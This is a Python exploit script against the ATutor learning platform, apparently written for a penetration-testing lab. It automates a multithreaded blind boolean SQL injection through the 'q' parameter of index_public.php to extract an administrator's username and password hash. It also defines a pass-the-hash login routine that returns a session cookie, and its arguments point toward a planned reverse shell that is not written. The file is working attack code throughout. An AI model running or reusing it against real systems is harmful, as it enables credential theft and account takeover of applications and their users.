#!/usr/bin/python3
# -*- coding: UTF-8 -*-
# Author: ndqk <ngduyquockhanh@gmail.com>

import hashlib
import queue
import sys
from unicodedata import name
import requests
from queue import Queue
from threading import Thread
import zipfile
import subprocess

# Exploit SQLi to get credentials
def exploitSQLi(ip, thread = 100): 
    class ExploitSQLiExtractChar(Thread):

        def __init__(self, queue, result):
            Thread.__init__(self)
            self.queue = queue
            self.result = result

        def run(self):
            while True:
                # Get the work from the queue and expand the tuple
                index, char, target = self.queue.get()
                try:
                    response = requests.get(target)
                    content_length = int(response.headers['Content-Length'])
                    if(content_length > 20):
                        self.result[index] = chr(char)
                        # sys.stdout.write(chr(char))
                        # sys.stdout.flush()
                finally:
                    self.queue.task_done()

    class ExploitSQLiGetLength(Thread):

        def __init__(self, queue, result):
            Thread.__init__(self)
            self.queue = queue
            self.result = result

        def run(self):
            while True:
                # Get the work from the queue and expand the tuple
                number, target = self.queue.get()
                try:
                    response = requests.get(target)
                    content_length = int(response.headers['Content-Length'])
                    if(content_length > 20):
                        self.result[0] = number    
                finally:
                    self.queue.task_done()

    def exploit(length, query):
        queue = Queue()
        result = [None] * length
        
        for x in range(thread):
            worker = ExploitSQLiExtractChar(queue, result)
            worker.daemon = True
            worker.start()
            
        for i in range(1, length + 1):
            injection_string = "a'/**/or/**/(ascii(substring(({}),{},1)))=[CHAR]/**/or/**/1='".format(query, i)
            for j in range(32, 126):
                target = "http://{}/ATutor/mods/_standard/social/index_public.php?q={}".format(ip, injection_string.replace("[CHAR]", str(j)))
                index = i - 1
                queue.put((index, j, target))
        queue.join()
        return ''.join([str(elem) for elem in result])

    def getLength(query):
        queue = Queue()
        result = [None]

        for x in range(thread):
            worker = ExploitSQLiGetLength(queue, result)
            worker.daemon = True
            worker.start()

        inject_string = "a'/**/or/**/({})=[NUM]/**/or/**/1='".format(query)

        for i in range(100):
            target = "http://{}/ATutor/mods/_standard/social/index_public.php?q={}".format(ip, inject_string.replace("[NUM]", str(i)))
            queue.put((i, target))
            if(result[0] != None):
                break

        queue.join()
        return result[0]

    # Get Username Length
    print("(+) Retrieving username length...")
    query = "select/**/length(login)/**/from/**/AT_members/**/where/**/status=3/**/limit/**/1"
    user_length = getLength(query)
    print("(+) done! \n(+) username length: {}" .format(str(user_length)))

    # Get Username
    print("(+) Retrieving username...")
    query = "select/**/login/**/from/**/AT_members/**/where/**/status=3/**/limit/**/1"
    username = exploit(user_length, query)
    print("(+) done! username: " + username)

    # Get password length
    print("(+) Retrieving password length...")
    query = "select/**/length(password)/**/from/**/AT_members/**/where/**/login='{}'".format(username)
    password_length = getLength(query)
    print("(+) done! \n(+) password length: {}" .format(str(password_length)))

    # Get Password
    print("(+) Retrieving password...")
    query = "select/**/password/**/from/**/AT_members/**/where/**/login='{}'".format(username)
    password = exploit(password_length, query)
    print("(+) done! password: " + password)

    print("(+) Credentials: {} / {}" .format(username, password))

    return username, password

# Bypass authentication by use credential
def bypassAuthentication(ip, username, password):
    def genHash(password, token):
        sha1 = hashlib.sha1()
        sha1.update((password + token).encode())
        return sha1.hexdigest()

    target = "http://{}/ATutor/login.php".format(ip)
    token = "ndqk"
    hashed = genHash(password, token)
    data = {
        "form_login_action" : True,
        "form_course_id" : 0,
        "form_password_hidden" : hashed,
        "form_login" : username,
        "token" : token,
        "submit": "Login"
    }

    response = requests.post(target, data=data)
    if "You have logged in successfully." in response.text:
        return response.cookies['ATutorID']
    return None


def main():
    if len(sys.argv) != 4:
        print("(+) usage: {} <target> <lhost> <lport>".format(sys.argv[0]))
        print('(+) eg: {} 192.168.1.100 192.168.1.101 4444 '.format(sys.argv[0]))
    ip = sys.argv[1]
    lhost = sys.argv[2]
    lport = sys.argv[3]

    username, password = exploitSQLi(ip)
    print(username)
    print(password)


if __name__ == "__main__":
    main()
